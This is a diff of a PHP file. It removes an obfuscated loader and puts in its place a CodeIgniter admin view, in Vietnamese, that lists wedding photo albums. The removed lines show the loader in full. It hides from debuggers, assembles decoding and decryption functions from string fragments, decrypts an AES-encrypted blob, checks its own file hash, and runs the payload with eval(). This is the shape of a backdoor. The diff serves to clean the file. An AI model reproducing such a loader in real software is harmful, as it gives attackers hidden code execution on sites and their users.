@@ -1,28 +1,24 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_sg2181ja=('bas'.'e64'.'_de'.'cod'.'e');
-$_mu9qkvg1=('gzu'.'nco'.'mpr'.'ess');
-$_mld6e5b3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_dhjcpq54='nRe9KQpcbTw=';
-$_c23mpmlh='B/YbzEfB';
-$_bxg7exz8='dn/rRQNe';
-$_ji64pwek='VJKyVJqg';
-$_s821m2se='utkyZwhy';
-$_guklzal5='T9/W1ZN4';
-$_o26kjv4q='GU6LVQ==';
-$_ua6xaux2='3bQTemYM';
-$_n3kkeqgl=$_sg2181ja($_bxg7exz8.$_ji64pwek.$_s821m2se.$_c23mpmlh.$_dhjcpq54);
-$_rpl06xpo=$_sg2181ja($_guklzal5.$_ua6xaux2.$_o26kjv4q);
-$_h59bzwq0=$_sg2181ja('G8lbl2QA8PokJRmJoK1ryLUJRKa86O9rriU/+ZiFYUFfZLAgwpP8gzpBbsNX89r7AQuZgSVlELmdrQ1fO1hkHvQG6OSxYKCuIicYwCP+gJpndeYKck0bZl90KWrSd/psrzwHeOPT66ZQTmZ1WbEpioK+VR+vU36/LSQr2DrV6hlupNCqmEhx/mJRuMXbqRdCI24pDjedJCsfFFx1b2hMCPwLWmhH0GDhISIfYuXWV/lj+J2evhqhGmLWgbkBJO1C9pKsKoTBSRLXOOSyJ/MEMl1kGSQdMvgaIOd7fug87Htt6wpq0VdPoW7AHjXxLFiBsL+/95lNVXtwlg3KqqZjJXoCS9yJgyVVBQXhMnb88uYkNkEeSe0giDXmR0d7yBgknEc3Y4HQ3D9aEJkN1qaUa1i6tZLKFX8gDdW7BMkliot0SJlzckhKApVH+SuDZwH2vafNARRt6+a9qYVcjh3AlxpGOLi5w3CiQKL4m3H0A2XW01YAFgdOnCGBq9Vzm0b34rJRVGqV4L+9itlaQSIvK3C7DmKqKYbiYqYdnTB/MFlMG6X521IsfeyAzp5fgA/k1Dkdfah2Nl7p26j0JUrhdvp3PEtv+ngvEKB6XwLTtRz3KC7XCieNJtkWOQhqUAR3SOrRQKZhvqkiUl23GLXllBeLMDVpvKRgp38M4cXpcLQEXME7RDdSaFtdj5K3mu5xxdgqNXHRK0YUoU/OwNoJBkVU04Xo+EXCtOZtZX3+ZUynEXDLckGlq/D9gp/aN8hMA5Wla+jUTE0ZHSRDOFZB9Uxw5SDWDRsZ2ttEq0AggxrpmCFnzhP5AVo9SzCK+2dQp2fW8pTFGcGQt0edZGBdCga3VSMlZvhgExx0mbUmPhmueRh3GDaAn1vkJvTHNrp8b7f0wswMFLP1qRlMevWsJ/56wpAhTSpp5jdrd0Q9TXAUteeK5+nFrU0bBSik5x8t6L/1mNCW+kyfuEYAwFkANr1YAxjGE5InQl+y23cQBZokxNsILy5Av0KDfYI4IBt1pUnh4nuWW3LDRMzBOKjDeFNVzs/VdDCFk5vTMhSjuPhbQSQAR90x1RPPvN3gKKjCDwIvbUSv1GshaopS+DBdAxjdZOkZqovZNmzVAvYbJT9jOytUzskMetAS0+HMsQVS47be+ppxheEUWykYowdtPsxivyxprWaD6s+nLX1pPr8u+EPC5RNH99uhx/PXndNE');
-$_x21ey651=$_mld6e5b3($_h59bzwq0,'aes-256-cbc',$_n3kkeqgl,OPENSSL_RAW_DATA,$_rpl06xpo);
-if($_x21ey651===false){exit;}
-$_sws82p1z=$_mu9qkvg1($_x21ey651);
-if($_sws82p1z===false){exit;}
-$_yo0hsshx='29e06ca330bbee3ff0af495d6f2455b9619a8ffc9615c364ee307612b064792e';
-$_wvowmgdv=@file_get_contents(__FILE__);
-if($_wvowmgdv!==false){
-$_mevfjaz7=str_replace($_yo0hsshx,"0000000000000000000000000000000000000000000000000000000000000000",$_wvowmgdv);
-$_po3n2s5n=hash("sha256",$_mevfjaz7);
-if($_po3n2s5n!==$_yo0hsshx){@http_response_code(403);exit;}
-}
-eval($_sws82p1z);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$vis = array('public' => __('Công khai'), 'password' => __('Có mật khẩu'), 'hidden' => __('Ẩn')); ?>
+<div class="panel-head">
+  <h1 class="adm-title"><?= e(__('Ảnh')) ?></h1>
+  <a class="btn btn-accent" href="<?= base_url('admin/albums/create') ?>">+ <?= e(__('Album mới')) ?></a>
+</div>
+<nav class="tabs" aria-label="<?= e(__('Ảnh')) ?>">
+  <a class="<?= $this->uri->segment(2) === 'albums' ? 'on' : '' ?>" href="<?= base_url('admin/albums') ?>"><?= e(__('Album{_}', array('_' => ''))) ?></a>
+  <a class="<?= $this->uri->segment(2) === 'moderation' ? 'on' : '' ?>" href="<?= base_url('admin/moderation') ?>"><?= e(__('Ảnh khách gửi chờ duyệt')) ?><?= !empty($pending_photos) ? ' (' . (int) $pending_photos . ')' : '' ?></a>
+</nav>
+<p class="muted small"><?= e(__('Bấm vào album để thêm ảnh. Kéo thả để đổi thứ tự hiển thị trên trang cưới.')) ?></p>
+<ul class="album-rows" data-sortable data-sort-endpoint="<?= base_url('admin/albums/reorder') ?>">
+  <?php foreach ($albums as $a): ?>
+  <li class="album-row" draggable="true" data-id="<?= (int) $a['id'] ?>">
+    <span class="drag" aria-hidden="true">⋮⋮</span>
+    <span class="adm-album-cover sm"><?php if ($a['cover']): ?><img src="<?= photo_url($a['cover'], 't') ?>" alt="" loading="lazy"><?php endif; ?></span>
+    <a class="album-row-title" href="<?= base_url('admin/albums/view/' . $a['id']) ?>"><?= e($a['title']) ?></a>
+    <span class="tag tag-<?= e($a['visibility']) ?>"><?= e($vis[$a['visibility']]) ?></span>
+    <span class="muted small"><?= e(__('{n} ảnh', array('n' => (int) $a['photo_count']))) ?><?php if ($a['pending_count']): ?> · <?= e(__('{n} chờ duyệt', array('n' => (int) $a['pending_count']))) ?><?php endif; ?><?php if ($a['allow_guest_upload']): ?> · <?= e(__('nhận ảnh khách')) ?><?php endif; ?></span>
+    <a class="btn btn-ghost btn-sm" href="<?= base_url('admin/albums/edit/' . $a['id']) ?>"><?= e(__('Sửa')) ?></a>
+  </li>
+  <?php endforeach; ?>
+</ul>
